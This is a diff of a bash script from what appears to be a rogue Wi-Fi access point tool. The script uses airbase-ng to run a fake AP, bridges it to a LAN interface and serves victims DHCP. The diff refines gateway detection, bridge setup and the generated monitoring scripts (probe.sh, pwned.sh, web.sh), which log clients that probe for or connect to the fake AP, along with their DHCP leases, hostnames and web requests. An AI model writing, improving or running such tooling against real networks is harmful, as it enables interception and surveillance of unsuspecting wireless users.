@@ -79,8 +79,8 @@ INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
 if [ "$INTERNETTEST" = "64" ]; then echo "Reply from 8.8.8.8: bytes=64"; else echo "Request timed out."; fi
 }
 function pinggateway(){
-GATEWAYRDNS=$(route | awk '/UG/ { print $2 }')
-GATEWAY=$(route -n | awk '/UG/ { print $2 }')
+GATEWAYRDNS=$(awk '/br-lan/ && /UG/ {print $2}' < <(route))
+GATEWAY=$(awk '/br-lan/ && /UG/ { print $2 }' < <(route -n))
 echo "Pinging $GATEWAYRDNS [$GATEWAY] with 64 bytes of data:"
 GATEWAYTEST=$(awk '/bytes from/ { print $1 }' < <(ping $GATEWAY -c 1 -w 3))
 if [ "$GATEWAYTEST" = "64" ]; then echo "Reply from $GATEWAY: bytes=64"; else echo "Request timed out."; fi
@@ -219,9 +219,6 @@ gnome-terminal --geometry=130x15 --hide-menubar --title=DHCP-"$ESSID" -e \
 "udhcpd"
 }
 function brlan(){
-ifconfig br-lan down
-brctl delbr br-lan
-sleep 1
 brctl addbr br-lan
 brctl addif br-lan at0
 brctl addif br-lan $LANIFACE
@@ -237,10 +234,12 @@ while [ "$BRLANDHCP" = "No" ]; do
 echo ""
 echo "* No DHCP Server Found On $LANIFACE (br-lan) [$FAIL] *"
 rm $folder/bridge.log
+ifconfig br-lan down
+brctl delbr br-lan
 brlan
 done
-GATEWAY=
-#route add -net $at0IPBLOCK netmask $NETMASK gw $GATEWAY
+echo ""
+pinggateway
 }
 function lanifacemenu(){
 echo "+===================================+"
@@ -369,7 +368,7 @@ echo "echo \$$ > $folder/probe.pid" > $folder/probe.sh
 echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $folder/airbaseng.log)" >> $folder/probe.sh
 echo "echo \$$ > $folder/pwned.pid" > $folder/pwned.sh
 echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $folder/airbaseng.log) &" >> $folder/pwned.sh
-echo "awk '/DHCPACK\\(at0\\)/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
+echo "awk '/DHCPACK/ && /at0/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
 echo "echo \$$ > $folder/web.pid" > $folder/web.sh
 #echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
 echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
